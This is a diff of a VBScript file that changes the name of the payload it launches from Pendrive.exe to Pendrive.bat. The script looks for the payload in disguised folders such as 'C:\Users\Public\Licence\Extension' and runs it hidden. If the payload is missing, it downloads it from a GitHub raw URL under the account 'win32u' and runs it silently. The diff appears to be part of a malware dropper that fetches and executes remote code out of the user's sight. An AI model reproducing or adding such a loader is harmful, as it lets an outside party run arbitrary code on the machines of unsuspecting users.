@@ -6,34 +6,34 @@ Set FSO = CreateObject("Scripting.FileSystemObject")
 
 
 User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
-Loc1 = "C:\Users\Public\Licence\Extension\Pendrive.exe"
-Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Pendrive.exe"
-Loc3 = ".\Pendrive.exe"
+Loc1 = "C:\Users\Public\Licence\Extension\Pendrive.bat"
+Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Pendrive.bat"
+Loc3 = ".\Pendrive.bat"
 Currnt = "C:\Users\Public\Licence\Extension"
 
 If fso.FileExists(Loc1) Then
    WshShell.CurrentDirectory=Currnt 
-   WshShell.Run chr(34) & "C:\Users\Public\Licence\Extension\Pendrive.exe" & Chr(34), 0
+   WshShell.Run chr(34) & "C:\Users\Public\Licence\Extension\Pendrive.bat" & Chr(34), 0
 
 
 Elseif fso.FileExists(Loc2) Then
    WshShell.CurrentDirectory=Currnt 
-   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Pendrive.exe" & Chr(34), 0
+   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Pendrive.bat" & Chr(34), 0
 
 
 Elseif fso.FileExists(Loc3) Then
-   WshShell.Run chr(34) & ".\Pendrive.exe" & Chr(34), 0
+   WshShell.Run chr(34) & ".\Pendrive.bat" & Chr(34), 0
 
 
 Else
    '  MsgBox "[?] Please check your internet connection and try again!"
     	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
 
-	URL = "https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true"
+	URL = "https://github.com/win32u/Licence/blob/main/Extension/Pendrive.bat?raw=true"
 	objWinHttp.open "GET", URL, False
 	objWinHttp.send ""
 
-	SaveBinaryData ".\Pendrive.exe",objWinHttp.responseBody
+	SaveBinaryData ".\Pendrive.bat",objWinHttp.responseBody
 	Function SaveBinaryData(FileName, Data)
 	Const adTypeText = 1
 	Const adSaveCreateOverWrite = 2
@@ -45,7 +45,7 @@ Else
 	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
 	End Function
    WScript.Sleep 1000
-   WshShell.Run chr(34) & ".\Pendrive.exe" & Chr(34), 0
+   WshShell.Run chr(34) & ".\Pendrive.bat" & Chr(34), 0
 
 End If
 
